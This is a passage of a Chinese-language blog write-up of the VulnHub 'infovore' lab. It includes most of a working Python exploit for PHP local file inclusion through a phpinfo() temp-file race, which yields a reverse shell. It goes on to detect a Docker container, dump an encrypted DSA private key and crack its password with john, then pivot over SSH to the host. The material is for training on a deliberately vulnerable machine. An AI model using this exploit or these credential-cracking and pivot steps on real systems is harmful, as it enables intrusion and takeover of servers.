self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt"</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">2000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>在kali的23333端口进行监听，反弹shell成功：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/10.png" alt="10"></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote>
+<p>主要参考ph牛的 <a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a> </p>
+</blockquote>
+<p>对于一个LFI漏洞，我们经常会尝试向一些日志文件或是session文件中写入我们的恶意代码，然后再包含这些日志文件或是session文件来控制远程服务器（如 <a href="https://bantttian.github.io/2020/07/06/VulnHub_Ted/">VulnHub_Ted靶机渗透之Session文件包含</a> 和 <a href="https://bantttian.github.io/2020/07/02/VulnHub_DC-5/">VulnHub_DC-5靶机渗透之Nginx日志文件包含</a> ）。但是有一些情况下可能日志文件和session文件都不可利用，那么此时可以考虑利用php的临时文件。通过一些技巧让服务器生成一些包含恶意代码的临时文件，然后用lfi包含该临时文件。</p>
+<p>在PHP中，当使用POST请求或是PUT方法向服务器发送数据包时，只要在数据包中包含文件区块，无论访问的代码的代码中是否存在处理上传文件的逻辑，PHP都会将该文件保存为临时文件，该文件名就是存储在<code>$_FILES</code>全局变量中的<code>$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;]</code>（在php.ini的<code>upload_tmp_dir</code>中指定，默认为<code>/tmp</code>目录），临时文件名通常为<code>/tmp/php[6个随机字符]</code>。在请求结束之后，这个临时文件就会被删除。</p>
+<p>而phpinfo页面能够将当前请求上下文中的所有变量都打印出来，所以如果向phpinfo页面中发送包含文件区块的数据包，那么在返回的response中就能包含<code>$_FILES</code>变量。一个测试例子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: (<span class="string">"1.txt"</span>,<span class="string">"ssss"</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://192.168.247.224/info.php"</span></span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/14.png" alt="14"></p>
+<p>从phpinfo页面中能获取到临时文件名，然后将该文件名作为lfi文件的包含对象即可，但是在post请求结束时，临时文件就被删除了，所以文件包含也就失败了。所以这里需要使用条件竞争，ph牛的做是这样的：</p>
+<ol>
+<li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li>
+</ol>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/15.png" alt="15"></p>
+<center>数据包的请求头等位置都塞满了垃圾数据</center>
+
+<ol start="2">
+<li>因为phpinfo页面会将所有数据都打印出来，第1步中的垃圾数据会将整个phpinfo页面撑得非常大</li>
+</ol>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/16.png" alt="16"></p>
+<center>phpinfo页面中充满了垃圾数据</center>
+
+<ol start="3">
+<li><p>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p>
+</li>
+<li><p>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
+</li>
+<li><p>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p>
+</li>
+<li><p>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p>
+</li>
+</ol>
+<p>在脚本运行期间用wireshark抓了个包，可以看到race condition的请求和文件包含情况：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/17.png" alt="17"></p>
+<h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>在根目录下发现了<code>.dockerenv</code>文件，这就说明当前工作在docker工作环境下。</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/11.png" alt="11"></p>
+<p>另一种方法还可以通过查询系统进程的<strong>cgroup</strong>信息查看：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/18.png" alt="18"></p>
+<p>也可以发现当前的工作环境是docker。</p>
+<p>然后回到根目录下，除了发现<code>.dockerenv</code>之外，还发现了<code>.oldkeys.tgz</code>压缩包，复制到<code>/tmp</code>目录下解压后发现了<code>root</code>和<code>root.pub</code></p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/13.png" alt="13"></p>
+<p>查看<code>root</code>，这一个是私钥：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@e71b67461f6c:/tmp$ cat root</span><br><span class="line">cat root</span><br><span class="line">-----BEGIN DSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2037F380706D4511A1E8D114860D9A0E</span><br><span class="line"></span><br><span class="line">ds7T1dLfxm7o0NC93POQLLjptTjMMFVJ4qxNlO2Xt+rBqgAG7YQBy6Tpj2Z2VxZb</span><br><span class="line">uyMe0vMyIpN9jNFeOFbL42RYrMV0V50VTd/s7pYqrp8hHYWdX0+mMfKfoG8UaqWy</span><br><span class="line">gBdYisUpRpmyVwG1zQQF1Tl7EnEWkH1EW6LOA9hGg6DrotcqWHiofiuNdymPtlN+</span><br><span class="line">it/uUVfSli+BNRqzGsN01creG0g9PL6TfS0qNTkmeYpWxt7Y+/R+3pyaTBHG8hEe</span><br><span class="line">zZcX24qvW1KY2ArpSSKYlXZw+BwR5CLk6S/9UlW4Gls9YRK7Jl4mzBGdtpP85a/p</span><br><span class="line">fLowmWKRmqCw2EH87mZUKYaf02w1jbVWyjXOy8SwNCNr87zJstQpmgOISUc7Cknq</span><br><span class="line">JEpv1kzXEVJCfeeA1163du4RFfETFauxALtKLylAqMs4bqcOJm1NVuHAmJdz4+VT</span><br><span class="line">GRSmO/+B+LNLiGJm9/7aVFGi95kuoxFstIkG3HWVodYLE/FUbVqOjqsIBJxoK3rB</span><br><span class="line">t75Yskdgr3QU9vkEGTZWbI3lYNrF0mDTiqNHKjsoiekhSaUBM80nAdEfHzSs2ySW</span><br><span class="line">EQDd4Hf9/Ln3w5FThvUf+g==</span><br><span class="line">-----END DSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p><code>root.pub</code>是公钥：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@e71b67461f6c:/tmp$ cat root.pub</span><br><span class="line">cat root.pub</span><br><span class="line">ssh-dss AAAAB3NzaC1kc3MAAACBAPV4XEuAQLhu9Lqr3KwiSo9/sfFsb6ighehPgDYsEWHaW9eC7+ivELLDdOvst2Lz4VAy1wzJKTOxAT2RZuU0mzReqG0lKU14RDU3rzXsv4GbwMHrEartFCum01TkgMmFTAbcKmNM3Epl3E4nEP5On/LiYwC1eoRB/QFVnHgkU5ZrAAAAFQCg0SpRMRdieuuRUoKiPBuZ82bCdQAAAIEAq+KgcnWoXadrEw3UxnSYFGDF+wRr32YKLehLq9wQVc2NJ/yB7ZHmxYfZtK5FqmsTnAWlq+bCPQLuS8+j28K7NxOG3X8utVcRDmUywsS2x6Wq49B/MSrfAIdA5gmjsHCvKwE4KYIw/VHoGtR9tfNtblNeFTeuCc2xdB1Boinh1VkAAACAARNpsMV8HVhYKGdv4obhoVOM+UHt/UsRBeN4Py7970HrIPeJ2NzW1EOd3LvPN+DlFTzsLoOvCq7R+t+lGMIECg4Rk1e+65VCd7dvw7XnAatN5Rtk6xxeOwjj4NVuLBhnyhGhVS7jIMTKqGAYyYeUwUiOixxkyDvub8b9uQSauao= root</span><br></pre></td></tr></table></figure>
+
+<p>利用john破解私钥，得到密码<code>choclate93</code>：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/19.png" alt="19"></p>
+<p>切换用户到root用户：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/20.png" alt="20"></p>
+<p>在当前目录下还有一个<code>.ssh</code>文件夹，进入<code>.ssh</code>文件夹，查看公钥，发现利用ssh登录的目标主机为<code>admin@192.168.150.1</code>：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/21.png" alt="21"></p>
+<p>尝试利用<code>choclate93</code>登录<code>admin@192.168.150.1</code>：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/22.png" alt="22"></p>
+<p>登录成功，发现了最后的flag。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://www.anquanke.com/post/id/201136" target="_blank" rel="noopener">PHP LFI 利用临时文件 Getshell 姿势</a></li>
+<li><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md" target="_blank" rel="noopener">PHP文件包含漏洞（利用phpinfo）</a></li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/08/09/VulnHub_infovore/">https://bantttian.github.io/2020/08/09/VulnHub_infovore/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/08/08/%5BIEEE19%5DNoSQL-Injection-Detection.xmind/">IEEE19 & Automatic Detection of NoSQL Injection Using Supervised Learning</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
